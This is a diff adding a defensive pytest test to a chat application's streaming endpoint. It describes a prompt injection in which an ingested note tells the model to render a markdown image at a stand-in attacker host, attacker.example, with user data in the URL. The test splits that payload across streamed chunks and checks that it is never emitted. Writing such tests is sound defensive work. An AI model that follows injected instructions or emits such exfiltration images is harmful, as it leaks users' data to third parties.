@@ -485,3 +485,52 @@ async def test_generate_response_low_confidence_abstention_notice_and_no_cache()
     assert "<grounding_notice>" in captured_prompts[0][1].content
     assert out1["metadata"]["grounding"]["should_abstain"] is True
     assert out2["metadata"]["cache_hit"] is False
+
+
+@pytest.mark.asyncio
+async def test_stream_never_emits_an_injected_exfiltration_image() -> None:
+    """An ingested note told the model to render an attacker image carrying user data. The stream
+    must not emit it at any point (tokens reach the client before any post-processing)."""
+    own = "/api/images/attention.png"
+    pieces = ["Self-attention [1]. ", "![ch", "art](https://attacker.exa", "mple/p?d=weak+at+softmax)",
+              " and the figure ", f"![attention]({own})", " done."]
+
+    class _Chunk:
+        def __init__(self, text):
+            self.text = text
+
+    async def fake_astream_events(initial_state, config, version="v2"):
+        yield {"event": "on_chain_start", "name": "get_context", "data": {}}
+        yield {"event": "on_chain_end", "name": "get_context",
+               "data": {"output": {"rag_context": [{"content": "notes", "images": [{"url": own}]}]}}}
+        yield {"event": "on_chain_start", "name": "generate_response", "data": {}}
+        for p in pieces:
+            yield {"event": "on_chat_model_stream", "tags": ["final_response"], "data": {"chunk": _Chunk(p)}}
+        yield {"event": "on_chain_end", "name": "generate_response", "data": {}}
+
+    final = "Self-attention [1]. *chart* and the figure " + f"![attention]({own})" + " done."
+    snapshot = MagicMock()
+    snapshot.values = {"messages": [AIMessage(content=final)], "sources": [], "related_concepts": [], "metadata": {}}
+    mock_pg = AsyncMock()
+    mock_pg.execute_query = AsyncMock(return_value=[{"id": "conv-1"}])
+    mock_pg.execute_insert = AsyncMock(return_value="msg-1")
+    mock_pg.execute_update = AsyncMock(return_value=None)
+
+    with patch.object(chat_router, "get_postgres_client", AsyncMock(return_value=mock_pg)), \
+         patch.object(chat_router.chat_graph, "astream_events", side_effect=fake_astream_events), \
+         patch.object(chat_router.chat_graph, "aget_state", AsyncMock(return_value=snapshot)), \
+         patch.object(chat_router, "suggest_followups", AsyncMock(return_value=[])):
+        resp = await chat_router.stream_chat(
+            request=ChatRequest(user_id="u1", message="Explain self-attention", conversation_id="conv-1"),
+            current_user={"id": "u1"},
+        )
+        events = []
+        async for raw in resp.body_iterator:
+            text = raw.decode() if isinstance(raw, bytes) else raw
+            if text.startswith("data: "):
+                events.append(json.loads(text[6:].strip()))
+
+    streamed = "".join(e["content"] for e in events if e.get("type") in ("chunk", "replace"))
+    assert "attacker" not in streamed
+    assert f"![attention]({own})" in streamed
+    assert not any(e.get("type") == "replace" for e in events)  # stream and saved text agree
